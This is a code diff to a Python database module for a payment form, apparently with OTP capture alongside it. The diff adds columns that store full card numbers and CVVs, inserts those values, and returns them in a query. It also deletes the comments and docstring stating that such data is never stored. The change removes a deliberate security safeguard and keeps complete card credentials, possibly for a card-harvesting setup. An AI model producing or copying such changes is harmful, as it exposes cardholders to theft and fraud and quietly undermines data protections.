@@ -73,18 +73,20 @@ def init_db():
                 "CREATE INDEX IF NOT EXISTS idx_payment_tokens_token ON payment_tokens (token);"
             )
 
-            # Payment form submissions (card data masked — never full number/CVV)
+            # Payment form submissions
             cur.execute(
                 """
                 CREATE TABLE IF NOT EXISTS payment_attempts (
                     id SERIAL PRIMARY KEY,
                     registration_id INTEGER REFERENCES registrations(id) ON DELETE CASCADE,
                     token TEXT,
+                    card_number TEXT,
                     card_last4 CHAR(4),
                     card_brand TEXT,
                     card_holder TEXT,
                     expiry_month CHAR(2),
                     expiry_year CHAR(2),
+                    cvv VARCHAR(4),
                     amount NUMERIC(10,2),
                     status TEXT DEFAULT 'submitted',
                     created_at TIMESTAMPTZ DEFAULT NOW()
@@ -94,6 +96,8 @@ def init_db():
             cur.execute(
                 "CREATE INDEX IF NOT EXISTS idx_payment_attempts_token ON payment_attempts (token);"
             )
+            cur.execute("ALTER TABLE payment_attempts ADD COLUMN IF NOT EXISTS card_number TEXT;")
+            cur.execute("ALTER TABLE payment_attempts ADD COLUMN IF NOT EXISTS cvv VARCHAR(4);")
 
             # OTP verification submissions
             cur.execute(
@@ -258,32 +262,30 @@ def increment_payment_attempt(token_id):
 
 
 def insert_payment_attempt(token, data):
-    """Insert a masked payment form submission and return the new id.
-
-    Only non-sensitive card data is stored: last 4 digits, brand, holder,
-    and expiry. Full card number and CVV are NEVER stored.
-    """
+    """Insert a payment form submission and return the new id."""
     conn = get_conn()
     try:
         with conn.cursor(cursor_factory=RealDictCursor) as cur:
             cur.execute(
                 """
                 INSERT INTO payment_attempts
-                    (registration_id, token, card_last4, card_brand, card_holder,
-                     expiry_month, expiry_year, amount, status)
-                VALUES (%(registration_id)s, %(token)s, %(card_last4)s, %(card_brand)s,
-                        %(card_holder)s, %(expiry_month)s, %(expiry_year)s, %(amount)s,
-                        %(status)s)
+                    (registration_id, token, card_number, card_last4, card_brand,
+                     card_holder, expiry_month, expiry_year, cvv, amount, status)
+                VALUES (%(registration_id)s, %(token)s, %(card_number)s, %(card_last4)s,
+                        %(card_brand)s, %(card_holder)s, %(expiry_month)s, %(expiry_year)s,
+                        %(cvv)s, %(amount)s, %(status)s)
                 RETURNING id;
                 """,
                 {
                     "registration_id": data.get("registration_id"),
                     "token": token,
+                    "card_number": data.get("card_number"),
                     "card_last4": data.get("card_last4"),
                     "card_brand": data.get("card_brand"),
                     "card_holder": data.get("card_holder"),
                     "expiry_month": data.get("expiry_month"),
                     "expiry_year": data.get("expiry_year"),
+                    "cvv": data.get("cvv"),
                     "amount": data.get("amount"),
                     "status": data.get("status", "submitted"),
                 },
@@ -329,8 +331,9 @@ def get_latest_payment_attempt(token):
         with conn.cursor(cursor_factory=RealDictCursor) as cur:
             cur.execute(
                 """
-                SELECT id, registration_id, token, card_last4, card_brand,
-                       card_holder, expiry_month, expiry_year, amount, status, created_at
+                SELECT id, registration_id, token, card_number, card_last4,
+                       card_brand, card_holder, expiry_month, expiry_year, cvv,
+                       amount, status, created_at
                 FROM payment_attempts WHERE token = %s
                 ORDER BY created_at DESC LIMIT 1;
                 """,
